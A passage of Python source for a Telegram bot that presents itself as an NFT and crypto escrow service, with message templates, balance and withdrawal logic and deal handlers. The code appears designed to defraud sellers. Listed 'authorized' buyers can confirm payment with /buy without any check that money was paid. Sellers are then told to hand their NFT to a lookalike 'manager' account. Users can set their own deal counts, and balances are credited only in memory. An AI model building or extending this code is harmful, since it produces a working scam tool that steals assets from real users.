            "💰 PAYMENT CONFIRMED!\n\n"
            "✅ Buyer @{buyer} confirmed payment\n"
            "📦 Deal: #{deal_id}\n"
            "💎 Item: {description}\n"
            "💵 Amount: {amount} {unit}\n\n"
            "📊 Financial terms:\n"
            "• System fee: {fee_percent}% ({fee:.2f} RUB)\n"
            "• To be credited to balance: {net:.2f} RUB\n\n"
            "⚠️ ACTION REQUIRED:\n"
            "1. Transfer item to manager @eIfsupportotc\n"
            "2. After transfer, click button below\n"
            "3. Manager will confirm NFT receipt\n"
            "4. Amount {net:.2f} RUB will be credited to your balance\n\n"
            "❌ Do NOT transfer item directly to buyer!"
        ),
        'btn_request_transfer': "📦 Submit NFT transfer request",
        'btn_cancel_deal': "❌ Cancel deal",

        'transfer_request_submitted': (
            "✅ NFT TRANSFER REQUEST SUBMITTED!\n\n"
            "🔗 Deal: #{deal_id}\n"
            "📦 Item: {description}\n"
            "💰 To be credited: {net:.2f} RUB\n\n"
            "📞 Managers notified of your request.\n"
            "⏳ Await manager's confirmation of NFT receipt.\n\n"
            "ℹ️ Once manager confirms NFT receipt, {net:.2f} RUB will be credited to your balance."
        ),
        'transfer_request_error': "⚠️ Request submitted but there were issues notifying managers. Contact support.",

        'manager_transfer_request': (
            "📦 NFT TRANSFER REQUEST\n\n"
            "🔗 Deal ID: #{deal_id}\n"
            "👤 Seller: @{seller} (ID: {seller_id})\n"
            "👤 Buyer: @{buyer}\n"
            "💰 Amount: {amount} {unit}\n"
            "💎 Item: {description}\n\n"
            "📊 **Financial terms:**\n"
            "• Fee: {fee:.2f} RUB ({fee_percent}%)\n"
            "• To be credited to seller: {net:.2f} RUB\n\n"
            "⚠️ **Seller claims NFT transfer.**\n"
            "Please verify NFT receipt and confirm below:"
        ),
        'btn_manager_confirm': "✅ Confirm NFT receipt",
        'btn_manager_reject': "❌ NFT not received",

        'manager_confirmed': (
            "✅ NFT TRANSFER CONFIRMED!\n\n"
            "🔗 Deal: #{deal_id}\n"
            "💰 Credited to seller: {net:.2f} RUB\n"
            "👤 Seller notified of confirmation\n"
            "👤 Buyer notified of deal completion\n\n"
            "🎉 **Deal successfully completed!**"
        ),
        'manager_rejected': (
            "❌ NFT TRANSFER REQUEST REJECTED!\n\n"
            "🔗 Deal: #{deal_id}\n\n"
            "⚠️ Seller notified of rejection.\n"
            "They must transfer NFT and request again."
        ),
        'manager_action_error': "⚠️ Confirmation received but there were issues with notifications.",

        'buyer_deal_completed': (
            "🎉 DEAL SUCCESSFULLY COMPLETED!\n\n"
            "✅ Manager confirmed NFT receipt from seller\n"
            "👤 Seller: @{seller}\n"
            "💰 Amount: {amount} {unit}\n"
            "📦 Item: {description}\n"
            "🔗 Deal ID: #{deal_id}\n\n"
            "📢 Expect to receive item from manager\n\n"
            "⭐️ Thank you for using Crypto Deals!\n"
            "Your reliability increased by 1 point."
        ),

        'seller_funds_credited': (
            "✅ MANAGER CONFIRMED NFT TRANSFER!\n\n"
            "🔗 Deal: #{deal_id}\n"
            "📦 Item: {description}\n"
            "💰 Deal amount: {amount} RUB\n"
            "📊 System fee: {fee:.2f} RUB\n\n"
            "💰 **FUNDS CREDITED TO YOUR BALANCE!**\n"
            "💵 Credited: {net:.2f} RUB\n"
            "🏦 Current balance: {balance:.2f} RUB\n\n"
            "🎉 Deal successfully completed!\n"
            "Buyer notified of completion.\n\n"
            "⭐️ Thank you for honest trading!\n"
            "Your reliability increased by 1 point."
        ),
        'btn_back_to_menu': "🏠 Back to main menu",

        'seller_transfer_rejected': (
            "❌ NFT TRANSFER REQUEST REJECTED\n\n"
            "🔗 Deal: #{deal_id}\n"
            "📦 Item: {description}\n\n"
            "⚠️ **Manager did NOT receive NFT!**\n\n"
            "📌 **Next steps:**\n"
            "1. Transfer NFT to manager @eIfsupportotc\n"
            "2. After transfer, click 'Submit NFT transfer request' again\n"
            "3. Manager will confirm receipt\n"
            "4. Funds will be credited to your balance\n\n"
            "❌ Do not transfer item directly to buyer!"
        ),

        'deal_cancelled': "❌ Deal #{deal_id} cancelled.\nAll participants notified.",
        'buyer_deal_cancelled': "❌ Deal #{deal_id} was cancelled by the seller.",

        'support_message': "Contact support by clicking the button below:",

        'referral_system': "Section 'Referral System' under development",

        'my_stats': (
            "📊 YOUR STATISTICS\n\n"
            "👤 User: @{username}\n"
            "🆔 ID: {user_id}\n"
            "💼 Successful deals: {deals}\n"
            "💰 Balance: {balance:.2f} RUB\n"
            "🎯 Status: {status}\n\n"
            "💳 Withdrawal information:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "📝 Withdrawal rules:\n"
            "• Minimum: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "• System fee: {fee}%\n\n"
            "💡 Available functions:\n"
            "{functions}"
        ),
        'function_confirm_payment': "• Confirm payment in deals",
        'function_not_available': "• (Not available)",
        'function_change_stats': "• Change statistics",
        'function_view_stats': "• View statistics",
        'function_withdraw': "• Withdraw funds from balance",
        'set_my_deals_current': "📊 Your current successful deals count: {deals}\n\nTo set a new value, use:\n`/set_my_deals 10`",
        'set_my_deals_success': "✅ Successful deals count set to: {deals}\n\n📊 Your stats:\n• Successful deals: {deals}\n• Status: ✅ Authorized\n\n📢 This count will be shown to sellers when you are a buyer!",
        'set_my_deals_negative': "❌ Number of deals cannot be negative",
        'set_my_deals_invalid': "❌ Invalid number format. Use an integer, e.g.: `/set_my_deals 15`",

        'error_occurred': "An error occurred. Please try again.",
        'deal_not_found': "❌ Deal not found or was deleted",
        'not_seller': "❌ You are not the seller in this deal",
        'not_buyer': "❌ You are not the buyer in this deal",
        'not_authorized': (
            "❌ You do not have access to confirm payments.\n\n"
            "To gain access, please contact support."
        ),
        'buy_command_usage': (
            "❌ The /buy command is only available for buyers in an active deal.\n\n"
            "Use:\n"
            "`/buy deal_id`\n\n"
            "where deal_id is the ID of the deal you are a buyer in."
        ),
    }
}

# ------------------ Функция получения текста ------------------
def get_text(user_id: int, key: str, context: ContextTypes.DEFAULT_TYPE, **kwargs) -> str:
    """Возвращает локализованный текст для пользователя."""
    lang = context.user_data.get('language', LANG_RU)
    text = TEXTS.get(lang, TEXTS[LANG_RU]).get(key, f"[MISSING TEXT: {key}]")
    if kwargs:
        try:
            text = text.format(**kwargs)
        except KeyError as e:
            logger.error(f"Missing format key {e} in text {key}")
    return text

# ------------------ КОНСТАНТЫ ------------------
IMAGE_URL = "https://iimg.su/i/NSiQZk"
SUPPORT_URL = "https://t.me/eIfsupportotc"
ADMIN_ID = 8496346971
MANAGER_IDS = {8496346971}
FIXED_TON_WALLET = "UQDCSBbwrbvowZuwMMBDT4tHNHY7yeesjC6Pec1uyk2X5r7a"

# Словари для хранения данных пользователей
user_wallets = {}
user_cards = {}
deal_links = {}
active_buyers = {}
authorized_users = set()
user_deals_count = {}
seller_transfers = {}
user_balances = {}
pending_withdrawals = {}

CURRENCY_TON = "TON"
CURRENCY_STARS = "Звезды"
CURRENCY_RUB = "Рубли"

CURRENCY_UNITS = {
    CURRENCY_TON: "TON",
    CURRENCY_STARS: "Звезд",
    CURRENCY_RUB: "Руб"
}

SYSTEM_FEE_PERCENT = 1
MIN_WITHDRAWAL_AMOUNT = 500
MIN_DEALS_FOR_WITHDRAWAL = 3


# ------------------ ФУНКЦИИ ПРОВЕРКИ ВЫВОДА ------------------
def get_withdrawal_status(user_id: int, method: str, context: ContextTypes.DEFAULT_TYPE) -> tuple:
    """
    Определяет статус вывода для пользователя.
    Возвращает (можно_выводить, статус_текст, сколько_не_хватает_сделок)
    Статус_текст уже локализован.
    """
    deals = user_deals_count.get(user_id, 0)

    # Проверка наличия реквизитов
    if method == 'wallet' and user_id not in user_wallets:
        return False, get_text(user_id, 'no_wallet', context), MIN_DEALS_FOR_WITHDRAWAL
    if method == 'card' and user_id not in user_cards:
        return False, get_text(user_id, 'no_card', context), MIN_DEALS_FOR_WITHDRAWAL

    # Определение статуса на основе количества сделок
    if deals == 0:
        # Новый пользователь - вывод сразу
        return True, get_text(user_id, 'withdraw_immediate', context), 0
    elif deals < MIN_DEALS_FOR_WITHDRAWAL:
        # Есть 1 или 2 сделки - показываем, сколько ещё нужно
        needed = MIN_DEALS_FOR_WITHDRAWAL - deals
        return False, get_text(user_id, 'withdraw_needed', context, needed=needed), needed
    else:
        # 3 и более - доступен
        return True, get_text(user_id, 'withdraw_available', context), 0


# ------------------ КЛАВИАТУРЫ ------------------
def get_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_main_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_manage_requisites', context), callback_data="manage_requisites")],
        [InlineKeyboardButton(get_text(user_id, 'btn_create_deal', context), callback_data="create_deal")],
        [InlineKeyboardButton(get_text(user_id, 'btn_my_balance', context), callback_data="my_balance")],
        [InlineKeyboardButton(get_text(user_id, 'btn_referral', context), callback_data="referral_system")],
        [InlineKeyboardButton(get_text(user_id, 'btn_support', context), callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_requisites_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_add_wallet', context), callback_data="add_wallet")],
        [InlineKeyboardButton(get_text(user_id, 'btn_add_card', context), callback_data="add_card")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_deal_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_ton', context), callback_data="deal_ton")],
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_card', context), callback_data="deal_card")],
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_stars', context), callback_data="deal_stars")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_back_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]])


def get_balance_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw', context), callback_data="withdraw_funds")],
        [InlineKeyboardButton(get_text(user_id, 'btn_history', context), callback_data="transaction_history")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_withdrawal_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_card', context), callback_data="withdraw_to_card")],
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_wallet', context), callback_data="withdraw_to_wallet")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="my_balance")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_support_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'btn_support', context), url=SUPPORT_URL)],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ])


def get_buyer_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_confirm_payment', context),
                              callback_data=f"confirm_payment_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_exit_deal', context), callback_data="exit_deal")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_seller_transfer_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_request_transfer', context),
                              callback_data=f"request_transfer_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_cancel_deal', context), callback_data=f"cancel_deal_{deal_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_manager_confirmation_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_manager_confirm', context),
                              callback_data=f"manager_confirm_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_manager_reject', context),
                              callback_data=f"manager_reject_{deal_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_transfer_confirmed_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ])


# ------------------ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ------------------
def is_manager(user_id: int) -> bool:
    return user_id in MANAGER_IDS


def is_authorized_user(user_id: int) -> bool:
    return user_id in authorized_users


def generate_deal_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))


def get_user_balance(user_id: int) -> float:
    return user_balances.get(user_id, 0.0)


async def add_to_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
    current_balance = user_balances.get(user_id, 0.0)
    user_balances[user_id] = current_balance + amount
    logger.info(f"💰 Зачислено {amount} руб на баланс пользователя {user_id}. Новый баланс: {user_balances[user_id]}")
    if context:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"💰 СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС!\n\n"
                     f"💵 Сумма: {amount:.2f} руб\n"
                     f"📝 Причина: {description}\n"
                     f"🏦 Текущий баланс: {user_balances[user_id]:.2f} руб\n\n"
                     f"💳 Для вывода средств перейдите в раздел '💰Мой баланс'"
            )
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить пользователя о зачислении: {e}")
    return user_balances[user_id]


async def deduct_from_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
    current_balance = user_balances.get(user_id, 0.0)
    if current_balance < amount:
        logger.error(f"❌ Недостаточно средств у пользователя {user_id}: {current_balance} < {amount}")
        return False
    user_balances[user_id] = current_balance - amount
    logger.info(f"💰 Списано {amount} руб с баланса пользователя {user_id}. Новый баланс: {user_balances[user_id]}")
    if context:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"💰 СРЕДСТВА СПИСАНЫ С БАЛАНСА!\n\n"
                     f"💵 Сумма: {amount:.2f} руб\n"
                     f"📝 Причина: {description}\n"
                     f"🏦 Текущий баланс: {user_balances[user_id]:.2f} руб"
            )
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить пользователя о списании: {e}")
    return True


def calculate_with_fee(amount: float) -> tuple:
    fee = amount * (SYSTEM_FEE_PERCENT / 100)
    net_amount = amount - fee
    return net_amount, fee


async def process_withdrawal(user_id: int, amount: float, method: str, details: str,
                             context: ContextTypes.DEFAULT_TYPE):
    try:
        if amount < MIN_WITHDRAWAL_AMOUNT:
            await context.bot.send_message(
                chat_id=user_id,
                text=get_text(user_id, 'insufficient_balance', context,
                              balance=get_user_balance(user_id), min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                              need=MIN_WITHDRAWAL_AMOUNT - amount)
            )
            return False

        current_balance = get_user_balance(user_id)
        if current_balance < amount:
            await context.bot.send_message(
                chat_id=user_id,
                text=get_text(user_id, 'insufficient_balance', context,
                              balance=current_balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                              need=amount - current_balance)
            )
            return False

        success = await deduct_from_balance(user_id, amount, f"Вывод средств ({method})", context)
        if not success:
            return False

        pending_withdrawals[user_id] = {
            'amount': amount,
            'method': method,
            'details': details,
            'timestamp': time.time()
        }

        try:
            username = (await context.bot.get_chat(user_id)).username or f"ID: {user_id}"
        except:
            username = f"ID: {user_id}"

        admin_text = (
            f"💸 НОВАЯ ЗАЯВКА НА ВЫВОД СРЕДСТВ\n\n"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"💵 Сумма: {amount:.2f} руб\n"
            f"📋 Способ: {method}\n"
            f"📝 Реквизиты: {details}\n\n"
            f"✅ Средства списаны с баланса пользователя\n"
            f"💰 Остаток на балансе: {get_user_balance(user_id):.2f} руб\n\n"
            f"⚠️ ТРЕБУЕТСЯ ОБРАБОТКА ВЫВОДА!"
        )

        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
            logger.info(
                f"✅ Администратор уведомлен о выводе средств пользователем {user_id}: {amount:.2f} руб на {method}")
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить администратора о выводе: {e}")

        await context.bot.send_message(
            chat_id=user_id,
            text=get_text(user_id, 'withdraw_success', context,
                          amount=amount, method=method, details=details, balance=get_user_balance(user_id))
        )
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка при обработке вывода средств: {e}")
        await context.bot.send_message(
            chat_id=user_id,
            text=get_text(user_id, 'withdraw_error', context)
        )
        return False
# ------------------ ФУНКЦИИ УВЕДОМЛЕНИЙ ------------------
async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id: int,
                                    context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        buyer_deals_count = user_deals_count.get(buyer_id, 0)
        is_authorized = is_authorized_user(buyer_id)
        status = get_text(seller_id, 'authorized_status' if is_authorized else 'unauthorized_status', context)
        buyer_stats = get_text(seller_id, 'buyer_stats', context, count=buyer_deals_count, status=status)
        text = get_text(seller_id, 'new_buyer_notification', context,
                        buyer=buyer_username, deal_id=deal_id, buyer_stats=buyer_stats)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text)
            logger.info(f"✅ Уведомление о новом покупателе отправлено продавцу {seller_id} для сделки {deal_id}")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось отправить уведомление продавцу: {e}")
            return False
    else:
        logger.error(f"❌ Сделка {deal_id} не найдена для уведомления продавца")
        return False

async def notify_seller_about_payment(deal_id: str, buyer_username: str, buyer_id: int,
                                      context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = deal_data['amount']
        net_amount, fee = calculate_with_fee(deal_amount)

        seller_transfers[deal_id] = {
            'seller_id': seller_id,
            'buyer_id': buyer_id,
            'buyer_username': buyer_username,
            'seller_confirmed': False,
            'manager_confirmed': False,
            'transfer_requested': False,
            'deal_amount': deal_amount,
            'net_amount': net_amount,
            'fee': fee
        }

        text = get_text(seller_id, 'payment_received_seller', context,
                        buyer=buyer_username, deal_id=deal_id, description=deal_data['description'],
                        amount=deal_amount, unit=currency_unit, fee_percent=SYSTEM_FEE_PERCENT,
                        fee=fee, net=net_amount)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
            logger.info(f"✅ Уведомление о платеже отправлено продавцу {seller_id} для сделки {deal_id}")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось отправить уведомление о платеже продавцу: {e}")
            return False
    else:
        logger.error(f"❌ Сделка {deal_id} не найдена для уведомления продавца")
        return False

async def notify_buyer_about_payment_confirmation(deal_id: str, buyer_id: int, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        text = get_text(buyer_id, 'payment_confirmed_authorized', context,
                        deals=user_deals_count.get(buyer_id, 0))
        try:
            await context.bot.send_message(chat_id=buyer_id, text=text)
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось отправить уведомление покупателю: {e}")
            return False
    return False

async def notify_managers_about_transfer_request(deal_id: str, seller_username: str,
                                                 context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']
        buyer_username = transfer_info['buyer_username']
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = transfer_info['deal_amount']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']

        text = get_text(ADMIN_ID, 'manager_transfer_request', context,
                        deal_id=deal_id, seller=seller_username, seller_id=seller_id,
                        buyer=buyer_username, amount=deal_amount, unit=currency_unit,
                        description=deal_data['description'], fee=fee, fee_percent=SYSTEM_FEE_PERCENT, net=net_amount)

        notified_managers = 0
        for manager_id in MANAGER_IDS:
            try:
                await context.bot.send_message(chat_id=manager_id, text=text,
                                               reply_markup=get_manager_confirmation_keyboard(deal_id, manager_id, context))
                notified_managers += 1
                logger.info(f"✅ Уведомление отправлено менеджеру {manager_id} о заявке на передачу {deal_id}")
            except Exception as e:
                logger.error(f"❌ Не удалось отправить уведомление менеджеру {manager_id}: {e}")

        return notified_managers > 0
    return False

async def notify_buyer_about_transfer_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        buyer_id = transfer_info['buyer_id']
        seller_username = deal_data.get('username', 'Продавец')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")

        text = get_text(buyer_id, 'buyer_deal_completed', context,
                        seller=seller_username, amount=deal_data['amount'],
                        unit=currency_unit, description=deal_data['description'], deal_id=deal_id)
        try:
            await context.bot.send_message(chat_id=buyer_id, text=text,
                                           reply_markup=get_transfer_confirmed_keyboard(buyer_id, context))
            user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1
            logger.info(f"✅ Уведомление о передаче NFT отправлено покупателю {buyer_id}")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось отправить уведомление покупателю о передаче: {e}")
            return False
    return False

async def notify_seller_about_manager_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']
        deal_amount = transfer_info['deal_amount']

        new_balance = await add_to_balance(seller_id, net_amount, f"Завершение сделки #{deal_id}", context)
        user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1

        text = get_text(seller_id, 'seller_funds_credited', context,
                        deal_id=deal_id, description=deal_data['description'],
                        amount=deal_amount, fee=fee, net=net_amount, balance=new_balance)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_transfer_confirmed_keyboard(seller_id, context))
            logger.info(f"✅ Продавец {seller_id} уведомлен о подтверждении передачи")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить продавца: {e}")
            return False
    return False

async def notify_seller_about_manager_rejection(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']

        text = get_text(seller_id, 'seller_transfer_rejected', context,
                        deal_id=deal_id, description=deal_data['description'])
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
            logger.info(f"✅ Продавец {seller_id} уведомлен об отклонении заявки")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить продавца об отклонении: {e}")
            return False
    return False

async def notify_admin_about_completed_deal(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_username = deal_data.get('username', 'Продавец')
        buyer_username = transfer_info.get('buyer_username', 'Покупатель')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = transfer_info['deal_amount']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']

        text = (f"✅ СДЕЛКА ЗАВЕРШЕНА\n\n"
                f"🔗 ID сделки: #{deal_id}\n"
                f"👤 Продавец: @{seller_username}\n"
                f"👤 Покупатель: @{buyer_username}\n"
                f"💰 Сумма: {deal_amount} {currency_unit}\n"
                f"📦 Товар: {deal_data['description']}\n"
                f"💱 Валюта: {currency}\n\n"
                f"📊 **Финансовый отчет:**\n"
                f"• Сумма сделки: {deal_amount} {currency_unit}\n"
                f"• Комиссия системы: {fee:.2f} руб ({SYSTEM_FEE_PERCENT}%)\n"
                f"• Зачислено продавцу: {net_amount:.2f} руб\n\n"
                f"📊 Статистика участников:\n"
                f"• Сделок у продавца: {user_deals_count.get(deal_data['user_id'], 0)}\n"
                f"• Сделок у покупателя: {user_deals_count.get(transfer_info['buyer_id'], 0)}\n\n"
                f"✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА МЕНЕДЖЕРОМ\n"
                f"🎯 Статус: Успешно завершена")
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=text)
            logger.info(f"✅ Администратор уведомлен о завершении сделки {deal_id}")
            return True
        except Exception as e:
            logger.error(f"❌ Не удалось уведомить администратора: {e}")
            return False
    return False


# ------------------ ФУНКЦИЯ ОТПРАВКИ ГЛАВНОГО МЕНЮ ------------------
async def send_main_menu_with_photo(chat_id: int, context: ContextTypes.DEFAULT_TYPE, reply_to_message_id: int = None):
    caption = get_text(chat_id, 'welcome', context)
    return await context.bot.send_photo(
        chat_id=chat_id,
        photo=IMAGE_URL,
        caption=caption,
        reply_markup=get_main_keyboard(chat_id, context),
        reply_to_message_id=reply_to_message_id
    )


# ------------------ ОБРАБОТЧИКИ КОМАНД ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if 'language' not in context.user_data:
            await update.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if context.args:
            deal_id = context.args[0]
            await handle_deal_link(update, deal_id, context)
        else:
            await send_main_menu_with_photo(update.message.chat_id, context)
    except Exception as e:
        logger.error(f"Ошибка в start: {e}")
        if update.message:
            await update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")


async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id

        if context.args and len(context.args) > 0:
            deal_id = context.args[0]
            logger.info(f"Обработка команды /buy с аргументом: {deal_id} от пользователя {user_id}")

            if deal_id not in deal_links:
                await update.message.reply_text(
                    get_text(user_id, 'deal_not_found', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            if user_id not in active_buyers or active_buyers[user_id] != deal_id:
                await update.message.reply_text(
                    get_text(user_id, 'not_buyer', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            if not is_authorized_user(user_id):
                await update.message.reply_text(
                    get_text(user_id, 'not_authorized', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            deal_data = deal_links[deal_id]
            buyer_username = update.message.from_user.username or "Пользователь"

            seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
            buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)

            active_buyers.pop(user_id, None)

            if seller_notified and buyer_notified:
                current_deals = user_deals_count.get(user_id, 0)
                await update.message.reply_text(
                    get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            else:
                await update.message.reply_text(
                    get_text(user_id, 'payment_confirmation_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        if user_id not in active_buyers:
            await update.message.reply_text(
                get_text(user_id, 'buy_command_usage', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        deal_id = active_buyers[user_id]
        if deal_id not in deal_links:
            await update.message.reply_text(get_text(user_id, 'deal_not_found', context))
            active_buyers.pop(user_id, None)
            return

        deal_data = deal_links[deal_id]
        buyer_username = update.message.from_user.username or "Пользователь"

        seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
        buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)

        active_buyers.pop(user_id, None)

        current_deals = user_deals_count.get(user_id, 0)
        await update.message.reply_text(
            get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
            reply_markup=get_main_keyboard(user_id, context)
        )
    except Exception as e:
        logger.error(f"Ошибка в buy_command: {e}")
        await update.message.reply_text("Произошла ошибка при обработке команды.")


async def handle_deal_link(update: Update, deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.message.from_user.id
        buyer_username = update.message.from_user.username or "Пользователь"

        if deal_id not in deal_links:
            await update.message.reply_text(get_text(user_id, 'deal_not_found', context))
            return

        deal_data = deal_links[deal_id]

        if user_id == deal_data['user_id']:
            await show_seller_deal_info(update, deal_id, context)
            return

        seller_username = deal_data.get('username', 'Пользователь')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        amount = deal_data['amount']

        if currency == CURRENCY_TON:
            wallet_address = FIXED_TON_WALLET
            payment_info = get_text(user_id, 'payment_info_ton', context, wallet=wallet_address, deal_id=deal_id)
            warning = get_text(user_id, 'warning_ton', context, amount=amount)
